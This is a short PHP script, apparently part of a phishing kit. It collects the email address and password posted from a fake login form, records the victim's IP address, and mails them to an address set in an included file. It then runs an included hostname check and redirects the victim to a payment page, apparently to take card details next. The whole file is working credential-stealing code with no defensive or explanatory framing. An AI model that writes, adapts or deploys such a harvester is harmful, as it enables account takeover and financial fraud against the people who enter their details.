<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$msg = "
----------- LOGIN ---------------->
Email Address : ".$_POST['email']."
Password : ".$_POST['password']."
IP : $ip
==================================";

include 'email.php';
$subj = "Login Of [$email] // - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
include 'hostname_check.php';

header("Location:payment.php?ip=$ip");
?>